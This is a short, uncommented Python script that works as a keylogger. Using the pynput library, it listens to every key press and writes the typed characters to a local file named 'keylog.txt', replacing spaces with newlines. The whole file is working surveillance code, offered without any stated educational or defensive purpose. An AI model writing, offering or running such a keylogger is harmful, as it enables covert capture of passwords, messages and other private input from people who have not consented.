from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open("keylog.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k + ' ') 

with Listener(on_press=on_press) as listener:
    listener.join()
